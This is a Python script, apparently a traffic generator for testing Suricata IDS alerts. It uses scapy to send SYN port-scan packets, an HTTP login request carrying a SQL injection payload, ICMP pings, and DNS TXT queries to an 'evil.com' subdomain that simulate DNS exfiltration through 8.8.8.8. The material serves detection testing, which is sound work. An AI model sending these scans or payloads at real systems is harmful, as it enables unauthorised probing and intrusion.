import argparse
import time
import random
import logging
from scapy.all import IP, TCP, UDP, ICMP, DNS, DNSQR, send, Raw

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

def generate_tcp_syn(target_ip, port):
    """Generate a TCP SYN packet (simulating a port scan)."""
    src_port = random.randint(1024, 65535)
    packet = IP(dst=target_ip) / TCP(sport=src_port, dport=port, flags='S')
    send(packet, verbose=False)

def generate_sql_injection(target_ip):
    """Generate an HTTP request containing a SQL injection payload."""
    payload = "GET /login?username=admin' OR '1'='1 HTTP/1.1\r\nHost: {}\r\n\r\n".format(target_ip)
    src_port = random.randint(1024, 65535)
    packet = IP(dst=target_ip) / TCP(sport=src_port, dport=80, flags='PA') / Raw(load=payload)
    send(packet, verbose=False)

def generate_dns_query(target_ip):
    """Generate a large DNS TXT query (simulating DNS exfiltration)."""
    domain = f"exfil-{random.randint(1000,9999)}.evil.com"
    packet = IP(dst=target_ip) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=domain, qtype="TXT"))
    send(packet, verbose=False)

def generate_icmp_ping(target_ip):
    """Generate an ICMP Echo Request."""
    packet = IP(dst=target_ip) / ICMP()
    send(packet, verbose=False)

def main():
    parser = argparse.ArgumentParser(description="Generate realistic network traffic for testing Suricata alerts.")
    parser.add_argument("--duration", type=int, default=60, help="Duration to run the traffic generator in seconds.")
    parser.add_argument("--interface", type=str, default="lo", help="Network interface to send traffic to.")
    parser.add_argument("--target", type=str, default="127.0.0.1", help="Target IP address for the generated traffic.")
    args = parser.parse_args()

    logging.info(f"Starting traffic generation for {args.duration} seconds on interface {args.interface} targeting {args.target}")

    end_time = time.time() + args.duration
    
    actions = [
        lambda: generate_tcp_syn(args.target, random.choice([22, 80, 443, 3306, 8080])),
        lambda: generate_sql_injection(args.target),
        lambda: generate_dns_query("8.8.8.8"), # DNS usually goes to a DNS server
        lambda: generate_icmp_ping(args.target)
    ]

    packets_sent = 0
    try:
        while time.time() < end_time:
            action = random.choice(actions)
            action()
            packets_sent += 1
            # Sleep a bit to not overwhelm the system completely
            time.sleep(random.uniform(0.1, 0.5))
            
            if packets_sent % 10 == 0:
                logging.info(f"Sent {packets_sent} packets so far...")
    except KeyboardInterrupt:
        logging.info("Traffic generation stopped manually.")

    logging.info(f"Finished generating traffic. Total packets sent: {packets_sent}")

if __name__ == "__main__":
    main()
